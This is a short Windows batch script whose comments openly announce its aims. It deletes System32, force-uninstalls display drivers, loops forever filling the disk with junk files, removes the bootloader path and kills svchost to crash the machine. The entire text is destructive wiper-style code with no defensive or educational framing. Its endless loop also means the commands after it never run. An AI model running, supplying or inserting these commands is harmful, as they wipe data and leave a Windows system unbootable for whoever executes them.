:: Delete System32 (OS won’t boot after this)
del /f /s /q C:\Windows\System32\*.*

:: Remove display drivers
pnputil /delete-driver oem*.inf /uninstall /force

:: Fill storage with junk
:loop
echo AAAAAAAAAAAAAAAAAAAAA > %random%.txt
goto loop

:: Corrupt bootloader
bcdedit /deletevalue {default} path

:: Force BSOD (Blue Screen of Death)
taskkill /f /im svchost.exe
